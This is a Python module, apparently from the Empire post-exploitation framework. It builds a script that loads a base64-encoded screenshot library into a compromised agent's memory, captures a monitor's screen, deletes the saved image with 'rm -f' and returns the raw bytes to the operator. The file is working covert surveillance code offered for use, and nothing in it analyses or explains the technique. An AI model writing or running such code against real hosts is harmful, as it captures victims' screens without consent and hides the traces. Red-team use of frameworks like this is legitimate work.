import base64
from typing import Dict, Optional, Tuple

from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ) -> Tuple[Optional[str], Optional[str]]:
        path = main_menu.installPath + "/data/misc/python_modules/mss.zip"
        open_file = open(path, "rb")
        module_data = open_file.read()
        open_file.close()
        module_data = base64.b64encode(module_data)
        script = """
import os
import base64
data = "{}"
def run(data):
    rawmodule = base64.b64decode(data)
    zf = zipfile.ZipFile(io.BytesIO(rawmodule), "r")
    if "mss" not in moduleRepo.keys():
        moduleRepo["mss"] = zf
        install_hook("mss")

    from mss import mss
    m = mss()
    file = m.shot(mon={},output='{}')
    raw = open(file, 'rb').read()
    run_command('rm -f %s' % (file))
    print(raw)

run(data)
""".format(
            module_data,
            params["Monitor"],
            params["SavePath"],
        )

        return script
